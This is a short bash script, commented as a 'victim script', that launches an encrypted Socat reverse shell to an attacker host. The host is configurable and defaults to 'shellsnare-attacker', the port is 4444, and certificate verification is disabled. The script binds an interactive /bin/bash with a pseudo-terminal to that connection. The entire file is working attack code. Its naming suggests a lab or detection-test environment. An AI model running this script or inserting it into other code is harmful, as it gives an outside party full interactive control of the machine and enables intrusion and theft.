#!/bin/bash
# Victim script to launch Socat SSL reverse shell to attacker
ATTACKER_IP=${ATTACKER_IP:-shellsnare-attacker}
PORT=4444
exec socat openssl-connect:${ATTACKER_IP}:${PORT},verify=0 exec:/bin/bash,pty,stderr,setsid,sigint,sane
